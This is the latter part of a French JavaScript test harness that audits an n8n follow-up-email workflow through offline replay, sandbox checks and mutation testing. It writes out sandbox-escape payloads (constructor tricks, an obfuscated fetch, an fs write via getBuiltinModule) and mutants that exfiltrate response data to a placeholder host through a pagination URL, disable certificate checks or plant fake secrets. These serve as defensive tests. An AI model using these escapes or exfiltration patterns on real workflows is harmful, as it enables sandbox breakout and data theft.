  const n8n = essai.sortie_n8n?.['Brouillons et bilan']?.[0]
  const jour = essai.sortie_n8n?.['Réglages du suivi']?.[0]?.jour
  if (!n8n || !jour) return [...e, 'essai : sortie de n8n illisible']
  try {
    const { sortie } = await passer(wf, lectures, jour)
    if (!memeValeur(sortie, n8n)) e.push(`essai : le rejeu hors ligne diffère de la sortie de n8n — rejeu ${JSON.stringify(trier(sortie)).slice(0, 300)}`)
    e.push(...invariants('essai n8n', lectures, jour, n8n))
    if (!memeValeur(normaliser(n8n), normaliser(oracle(lectures, jour)))) e.push('essai : la sortie de n8n diffère de la règle du brief')
    if (!n8n.brouillons.length || !n8n.bilan.ecartes.demo) e.push('essai : il doit montrer au moins un brouillon et un compte de démo écarté')
  } catch (err) { e.push(`essai : ${err.message}`) }
  return e
}

// ─── 7. Le bac à sable tient-il ? ─────────────────────────────────────────────────────────────────────────────────────────────
async function bacASable() {
  const e = []
  const s = await BAC.demander({ type: 'sonde', fichier: CHEMINS.export })
  if (s.permission !== true) e.push('bac à sable : le modèle de permissions de Node est inactif dans le processus enfant')
  for (const k of ['ecriture', 'lecture', 'processus', 'worker']) if (s[k] !== 'ERR_ACCESS_DENIED') e.push(`bac à sable : ${k} ${s[k]} dans le processus enfant (ERR_ACCESS_DENIED attendu)`)
  if (s.fetch_enfant !== 'undefined' || s.getBuiltinModule_enfant !== 'undefined') e.push(`bac à sable : fetch (${s.fetch_enfant}) ou process.getBuiltinModule (${s.getBuiltinModule_enfant}) encore présents dans l'enfant`)
  // L'évasion de l'annexe E de 032-010 (rapport.md:581-600), un `fetch` caché, `this.constructor.constructor`, un import() : rien n'est atteint.
  const evasions = {
    'annexe E': "const g = Function('return this')(); return [{ json: { fetch_reel: typeof g['fe' + 'tch'], process_reel: typeof g['pro' + 'cess'] } }];",
    'fetch caché': "let r = 'rien'; try { r = typeof globalThis['fe' + 'tch']; globalThis['fe' + 'tch']('https://exemple.invalid/x') } catch (e) { r = 'refusé' } return [{ json: { r } }];",
    'constructeur': "let r = 'rien'; try { r = typeof (this.constructor.constructor('return process')()) } catch (e) { r = 'refusé' } return [{ json: { r } }];",
    'constructeur d\'une fonction': "let r = 'rien'; try { r = typeof ((() => 0).constructor('return globalThis.process')()) } catch (e) { r = 'refusé' } return [{ json: { r } }];",
    'import dynamique': "let r = 'rien'; try { import('node:fs').then(() => {}, () => {}); r = 'tenté' } catch (e) { r = 'refusé' } return [{ json: { r } }];",
    'disque par process': "let r = 'rien'; try { process.getBuiltinModule('node:fs').writeFileSync('/tmp/suivi-qa-evasion', 'x'); r = 'écrit' } catch (e) { r = 'refusé' } return [{ json: { r } }];",
  }
  for (const [nom, code] of Object.entries(evasions)) {
    const r = await BAC.demander({ type: 'executer', jsCode: code, jour: '2026-11-10' })
    const sortie = JSON.stringify(r.items ?? [])
    if (/"function"|"object"|écrit/.test(sortie)) e.push(`bac à sable : l'évasion « ${nom} » atteint l'hôte (${sortie.slice(0, 120)})`)
    if (nom !== 'import dynamique' && !r.violations.length && !r.erreur) e.push(`bac à sable : l'évasion « ${nom} » n'est ni notée ni refusée`)
  }
  return { e, s }
}

// ─── Le jugement complet ──────────────────────────────────────────────────────────────────────────────────────────────────────
async function juger({ wf, briefTexte, essai, avecEmpreintes = true, auPremier = false }) {
  const brief = lireBrief(briefTexte)
  const sections = [
    () => structure(wf, brief),
    () => (avecEmpreintes ? empreintes(wf) : []),
    () => colonnesSourcees(brief),
    async () => { try { const t = (await executerNoeud(wf, 'Textes du suivi (brouillons)', [{ brouillons: [], reportes: [], ecartes: {}, silencieux: {} }], {}, '2026-11-10'))[0]?.textes; return verifierTextes(t, brief) } catch (err) { return [`Textes du suivi : ${err.message}`] } },
    async () => { try { return await rejeu(wf) } catch (err) { return [`rejeu : ${err.message}`] } },
    async () => essaiRejoue(wf, essai),
  ]
  const e = []
  for (const s of sections) { e.push(...(await s())); if (auPremier && e.length) break }
  return e
}

// ─── Les mutants ──────────────────────────────────────────────────────────────────────────────────────────────────────────────
const remplacer = (cible, avant, apres) => { if (!cible.includes(avant)) throw new Error(`mutant sans effet : « ${avant.slice(0, 60)} » introuvable`); return cible.split(avant).join(apres) }
const code = (nom, avant, apres) => (c) => { const n = noeud(c.wf, nom); n.parameters.jsCode = remplacer(n.parameters.jsCode, avant, apres) }
const param = (nomNoeud, nom, valeur) => (c) => { const p = noeud(c.wf, nomNoeud).parameters.queryParameters.parameters.find((x) => x.name === nom); if (!p) throw new Error('mutant sans effet'); p.value = valeur }
const texteNoeudEtBrief = (avant, apres) => (c) => { code('Textes du suivi (brouillons)', avant, apres)(c); c.briefTexte = remplacer(c.briefTexte, avant, apres) }
const ajouterNoeud = (n) => (c) => { c.wf.nodes.push(n); c.wf.connections['Brouillons et bilan'] = { main: [[{ node: n.name, type: 'main', index: 0 }]] } }
const MUTANTS = [
  // Fenêtres, comptes, événements (jugés SANS les empreintes : le rejeu doit les voir)
  { nom: 'fenêtre de J+14 décalée d\'un jour', f: code('Réglages du suivi', 'bilan_j14: { du: 14, au: 16 }', 'bilan_j14: { du: 15, au: 17 }'), raison: /bilan_j14|étapes|famille J\+14/ },
  { nom: 'filtre de démo ôté du code', f: code('Départ du suivi', "if (a.est_demo !== false) { ecarter('demo'); continue; }", ''), raison: /démo|demo/ },
  { nom: 'filtre fondateur ôté du code', f: code('Départ du suivi', "if (a.is_founder !== false) { ecarter('fondateur'); continue; }", ''), raison: /fondateur|compte écarté/ },
  { nom: 'filtre de suppression ôté du code', f: code('Départ du suivi', "if (a.suppression_demandee_le !== null) { ecarter('suppression_demandee'); continue; }", ''), raison: /suppression|compte écarté/ },
  { nom: 'opposition au suivi ignorée', f: code('Départ du suivi', 'n.suivi === false', 'n.suivi === 0'), raison: /opposition|compte écarté/ },
  { nom: 'filtre est_demo neutralisé dans la requête', f: param('Lire comptes', 'est_demo', 'not.is.null'), raison: /filtre est_demo/ },
  { nom: 'filtre est_demo retiré de la requête', f: (c) => { const l = noeud(c.wf, 'Lire comptes').parameters.queryParameters.parameters; l.splice(l.findIndex((p) => p.name === 'est_demo'), 1) }, raison: /filtre est_demo/ },
  { nom: 'registre ignoré', f: code('Garde du suivi', "if (cles.has(c.cle)) { ecarter('deja_au_registre'); continue; }", ''), raison: /registre|second passage|deux fois/ },
  { nom: 'écart de 5 jours ôté', f: code('Garde du suivi', "if (d !== undefined && ecart(R.jour, d) < R.ecart_min_jours) { ecarter('ecart_5_jours'); continue; }", ''), raison: /jours|registre/ },
  { nom: 'un brouillon par artisan ôté', f: code('Garde du suivi', "if (servis.has(c.artisan_id)) { ecarter('un_par_passage'); continue; }", ''), raison: /garde|même artisan/ },
  { nom: 'plafond qui perd au lieu de reporter', f: code('Garde du suivi', 'reportes.push({ cle: c.cle, artisan_id: c.artisan_id, etape: c.etape }); continue;', 'continue;'), raison: /plafond|reporté/ },
  { nom: 'événement inventé (id absent des données)', f: code('Étape premiers pas', 'evenement: { table, id, colonne, date }', "evenement: { table, id: '00000000-0000-4000-8000-999999999999', colonne, date }"), raison: /inventé/ },
  { nom: 'nombre gonflé d\'une unité', f: code('Étape bilan J+14', 'champs: x.champs, evenements', 'champs: Object.assign({}, x.champs, { demandes_recues: x.champs.demandes_recues + 1 }), evenements'), raison: /recompté|cité/ },
  { nom: 'brouillon sans événement', f: code('Garde du suivi', 'champs: c.champs, evenements: c.evenements', 'champs: c.champs, evenements: []'), raison: /sans événement/ },
  { nom: 'silencieux qui écrit quand même', f: code('Étape bilan J+30', 'if (!x.evenements.length) { silencieux += 1; continue; }', ''), raison: /sans événement|différente/ },
  { nom: 'demande importée comptée (bilan)', f: code('Étape bilan J+14', "if (l.canal !== 'import') compter", 'if (true) compter'), raison: /importée|recompté/ },
  { nom: 'demande importée comptée (premiers pas)', f: code('Étape premiers pas', "if (l.canal !== 'import') ajouter", 'if (true) ajouter'), raison: /importée|différente|reçoit/ },
  { nom: 'avoir compté comme facture émise', f: code('Étape bilan J+30', "&& l.avoir_de === null) compter", ') compter'), raison: /avoir|recompté/ },
  { nom: 'première réussite remplacée par la dernière', f: code('Étape premiers pas', 'l.sort((a, b) => a.t - b.t', 'l.sort((a, b) => b.t - a.t'), raison: /première réussite|différente/ },
  { nom: 'jour compté en UTC', f: code('Départ du suivi', "timeZone: 'Europe/Paris'", "timeZone: 'UTC'"), raison: /jour de Paris|différente|fenêtre/ },
  // Lectures (structure)
  { nom: 'colonne email ajoutée à un select=', f: param('Lire comptes', 'select', 'id,plan,created_at,is_founder,est_demo,suppression_demandee_le,notifications,email'), raison: /email.*hors de la liste permise/ },
  { nom: 'colonne nom ajoutée à un select=', f: param('Lire demandes', 'select', 'id,artisan_id,canal,created_at,nom_prospect'), raison: /nom_prospect.*hors de la liste permise/ },
  { nom: 'colonne en alias JSON (notifications->x)', f: param('Lire comptes', 'select', 'id,plan,created_at,is_founder,est_demo,suppression_demandee_le,notifications->email'), raison: /nom de colonne simple/ },
  { nom: 'option proxy', f: (c) => { noeud(c.wf, 'Lire devis').parameters.options.proxy = 'http://exemple.invalid:3128' }, raison: /proxy en trop/ },
  { nom: 'certificats non vérifiés', f: (c) => { noeud(c.wf, 'Lire devis').parameters.options.allowUnauthorizedCerts = true }, raison: /allowUnauthorizedCerts en trop/ },
  { nom: 'redirection suivie', f: (c) => { noeud(c.wf, 'Lire devis').parameters.options.redirect = { redirect: { followRedirects: true } } }, raison: /redirect en trop/ },
  { nom: 'réponse complète', f: (c) => { noeud(c.wf, 'Lire devis').parameters.options.response = { response: { fullResponse: true } } }, raison: /response en trop/ },
  { nom: 'pagination nextURL vers un tiers', f: (c) => { noeud(c.wf, 'Lire factures').parameters.options.pagination = { pagination: { paginationMode: 'responseContainsNextURL', nextURL: "={{ 'https://exemple.invalid/collecte?d=' + JSON.stringify($response.body) }}", limitPagesFetched: true, maxRequests: 50 } } }, raison: /nextURL|paginationMode/ },
  { nom: 'lecture en POST', f: (c) => { noeud(c.wf, 'Lire demandes').parameters.method = 'POST' }, raison: /méthode POST/ },
  { nom: 'hôte de la lecture changé', f: (c) => { noeud(c.wf, 'Lire demandes').parameters.url = 'https://exemple.invalid/rest/v1/leads' }, raison: /url/ },
  { nom: 'second identifiant', f: (c) => { noeud(c.wf, 'Lire devis').credentials.httpHeaderAuth = { id: 'x', name: 'autre' } }, raison: /identifiant/ },
  { nom: 'alwaysOutputData retiré (M10)', f: (c) => { delete noeud(c.wf, 'Lire registre du suivi').alwaysOutputData }, raison: /alwaysOutputData/ },
  { nom: 'onError sur une lecture (le registre manquant ne doit pas passer)', f: (c) => { noeud(c.wf, 'Lire registre du suivi').onError = 'continueRegularOutput' }, raison: /onError/ },
  // Envoi, activation, réglages, secrets
  { nom: 'nœud d\'envoi HTTP POST vers une API d\'envoi', f: ajouterNoeud({ id: 'x1', name: 'Envoyer', type: 'n8n-nodes-base.httpRequest', typeVersion: 4.5, position: [0, 0], parameters: { method: 'POST', url: 'https://api.resend.com/emails', sendBody: true } }), raison: /inattendu|connexions/ },
  { nom: 'nœud e-mail ajouté', f: ajouterNoeud({ id: 'x2', name: 'E-mail', type: 'n8n-nodes-base.emailSend', typeVersion: 2.1, position: [0, 0], parameters: { toEmail: 'x@exemple.invalid' } }), raison: /emailSend interdit/ },
  { nom: 'nœud Brevo ajouté', f: ajouterNoeud({ id: 'x3', name: 'Brevo', type: 'n8n-nodes-base.sendInBlue', typeVersion: 1, position: [0, 0], parameters: {} }), raison: /sendInBlue interdit/ },
  { nom: 'workflow actif', f: (c) => { c.wf.active = true }, raison: /ACTIF/ },
  { nom: 'workflow publié', f: (c) => { c.wf.activeVersionId = 'v1' }, raison: /publié/ },
  { nom: 'workflow d\'erreur inconnu branché', f: (c) => { c.wf.settings.errorWorkflow = 'inconnu' }, raison: /settings/ },
  { nom: 'exécutions réussies conservées', f: (c) => { delete c.wf.settings.saveDataSuccessExecution }, raison: /settings/ },
  { nom: 'faux secret dans l\'export', f: (c) => { c.wf.nodes.find((n) => n.type === 'n8n-nodes-base.stickyNote').parameters.content += ' ' + 'sk_' + 'live_' + 'Z'.repeat(24) }, raison: /secret/ },
  { nom: 'faux jeton dans un en-tête', f: (c) => { c.wf.nodes.find((n) => n.type === 'n8n-nodes-base.stickyNote').parameters.content += ' Bearer ' + 'abc'.repeat(8) }, raison: /secret/ },
  { nom: 'getWorkflowStaticData comme registre', f: code('Garde du suivi', 'const cles = new Set();', "const cles = new Set(); const st = $getWorkflowStaticData('global');"), raison: /getWorkflowStaticData/ },
  // Textes (le nœud ET le brief, pour viser la règle elle-même)
  { nom: 'texte marqué validé', f: code('Textes du suivi (brouillons)', "statut: 'brouillon',\n      objet: 'Vos premières", "statut: 'valide',\n      objet: 'Vos premières"), raison: /statut « valide »/ },
  { nom: 'texte du brief différent du nœud', f: (c) => { c.briefTexte = remplacer(c.briefTexte, 'Objet : Votre premier mois sur Presti', 'Objet : Votre premier mois chez Presti') }, raison: /brief différent/ },
  { nom: 'chiffre écrit dans un texte', f: texteNoeudEtBrief('Vos premières semaines sur Presti', 'Vos deux premières semaines sur Presti, en 2 minutes'), raison: /chiffre écrit/ },
  { nom: '« n8n » dans un texte', f: texteNoeudEtBrief('Votre premier mois sur Presti', 'Votre premier mois sur Presti avec n8n'), raison: /mot interdit « n8n »/ },
  { nom: '« Claude » dans un texte', f: texteNoeudEtBrief('Une première demande : la suite', 'Une première demande, lue par Claude : la suite'), raison: /mot interdit « Claude »/ },
  { nom: '« modèles » dans un texte', f: texteNoeudEtBrief('Votre première facture : la suite', 'Votre première facture et nos modèles : la suite'), raison: /mot interdit « modèle »/ },
  { nom: 'mention d\'IA ajoutée', f: texteNoeudEtBrief('Votre première facture est émise.', 'Votre première facture est émise. ' + mentionAssistant('')), raison: /mention d'IA/ },
  { nom: '« part seul » dans un texte Studio', f: texteNoeudEtBrief('Votre premier devis est parti.', 'Votre premier devis est parti, et la relance part seule.'), raison: /part seul/ },
  { nom: 'tournure culpabilisante (rang 10)', f: texteNoeudEtBrief('Après le devis accepté : la facture', 'Vous n’avez pas encore facturé : la facture'), raison: /tournure interdite/ },
  { nom: 'ligne pour ne plus recevoir retirée', f: (c) => { code('Textes du suivi (brouillons)', "const PIED = 'Pour ne plus recevoir ces e-mails de suivi, répondez « stop » à ce message.\\n\\nPresti';", "const PIED = 'Presti';")(c); c.briefTexte = c.briefTexte.split('Pour ne plus recevoir ces e-mails de suivi, répondez « stop » à ce message.\n\n').join('') }, raison: /ne plus recevoir/ },
  { nom: 'déclaration « mention non visée » retirée du brief', f: (c) => { c.briefTexte = remplacer(c.briefTexte, "**Mention d'IA : non visé.**", '') }, raison: /non visé/ },
  { nom: 'colonne du brief mal sourcée', f: (c) => { c.briefTexte = remplacer(c.briefTexte, '| `factures` | `emise_le` | `0041_facturation_electronique.sql:17` |', '| `factures` | `emise_le` | `0041_facturation_electronique.sql:19` |') }, raison: /absente de 0041/ },
  // Code et bac à sable
  { nom: 'un jsCode changé (empreinte)', f: code('Brouillons et bilan', '// Brouillons et bilan', '// Brouillons et bilan (retouché)'), empreintes: true, raison: /nouvel audit requis/ },
  { nom: 'fetch dans un nœud Code', f: code('Départ du suivi', 'const comptes = [];', "const comptes = []; try { globalThis['fe' + 'tch']('https://exemple.invalid/x') } catch (e) {}"), raison: /bac à sable/ },
  { nom: 'écriture disque depuis un nœud Code', f: code('Garde du suivi', 'const brouillons = [];', "const brouillons = []; try { process.getBuiltinModule('node:fs').writeFileSync('/tmp/suivi-qa-mutant', 'x') } catch (e) {}"), raison: /bac à sable/ },
  { nom: 'helpers de n8n par this', f: code('Brouillons et bilan', 'const par_etape = {};', "const par_etape = {}; try { this['help' + 'ers'].httpRequest({ url: 'https://exemple.invalid' }) } catch (e) {}"), raison: /bac à sable/ },
]

// ─── Lancement ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
const depart = { wf: lireJson(CHEMINS.export), briefTexte: readFileSync(CHEMINS.brief, 'utf8'), essai: lireJson(CHEMINS.essai) }
let code_sortie = 0
try {
  const { e: eBac, s } = await bacASable()
  const erreurs = [...eBac, ...(await juger({ ...copie(depart), briefTexte: depart.briefTexte }))]
  if (erreurs.length) {
    console.log(`ÉCHEC — ${erreurs.length} défaut(s) sur l'export réel :`)
    for (const x of erreurs.slice(0, 60)) console.log('  ✗ ' + x)
    code_sortie = 1
  } else {
    console.log('  ✓ structure : inactif, jamais publié ; 5 lectures GET au gabarit exact (options et pagination), select= = brief, filtres aux valeurs attendues ; réglages en liste blanche ; aucun secret ; chaîne exacte')
    console.log(`  ✓ empreintes : ${EMPREINTES.size} nœuds Code épinglés (posées par l'auteur : à reconfirmer par l'audit distinct)`)
    console.log('  ✓ colonnes : chacune à la ligne citée de sa migration ; le registre est « à créer »')
    console.log('  ✓ textes : égaux au brief, en brouillon, sans chiffre, mot interdit, marque, tournure du rang 10, mention d\'IA ni « part seul »')
    console.log('  ✓ rejeu : J−1 à J+40, 41 jours d\'affilée avec registre (et second passage du jour), registre et cinq jours, plafond qui reporte, jour de Paris, première réussite, garde seule, 40 jeux au hasard — invariants et oracle')
    console.log('  ✓ essai n8n : pin data rejouée hors ligne = sortie de n8n ; chaque nœud HTTP épinglé')
    console.log(`  ✓ bac à sable : processus enfant ${BAC.drapeaux.join(' ')} (Node ${s.node}) — écriture ${s.ecriture}, lecture ${s.lecture}, processus ${s.processus}, worker ${s.worker}, fetch ${s.fetch_enfant} ; réseau ${s.reseau}${s.reseau === 'ERR_ACCESS_DENIED' ? '' : ' (Node 24 n’a pas de barrage réseau : le code n’y atteint pas, faute de tout objet de l’hôte dans son contexte)'} ; évasions (annexe E de 032-010, fetch caché, constructeurs, import, disque) : rien d'atteint`)
  }
  // Les mutants : chacun doit rougir, pour sa raison.
  let tues = 0
  const survivants = []
  for (const m of MUTANTS) {
    const c = { ...copie(depart), briefTexte: depart.briefTexte }
    try { m.f(c) } catch (err) { survivants.push(`${m.nom} : ${err.message}`); continue }
    const e = await juger({ ...c, avecEmpreintes: m.empreintes === true, auPremier: true })
    if (!e.length) survivants.push(`${m.nom} : JUGE VERT (trou)`)
    else if (m.raison && !e.some((x) => m.raison.test(x))) survivants.push(`${m.nom} : rouge, mais pas pour la raison attendue (${e[0].slice(0, 160)})`)
    else tues++
  }
  console.log(`  ${survivants.length ? '✗' : '✓'} mutants : ${tues}/${MUTANTS.length} rouges pour la raison attendue (code jugé sans les empreintes)`)
  for (const x of survivants) console.log('  ✗ mutant ' + x)
  if (survivants.length) code_sortie = 1
} catch (err) {
  console.log('ÉCHEC — ' + (err && err.stack || err))
  code_sortie = 1
} finally { BAC.fermer() }
console.log(code_sortie ? 'ÉCHEC' : 'OK')
process.exit(code_sortie)
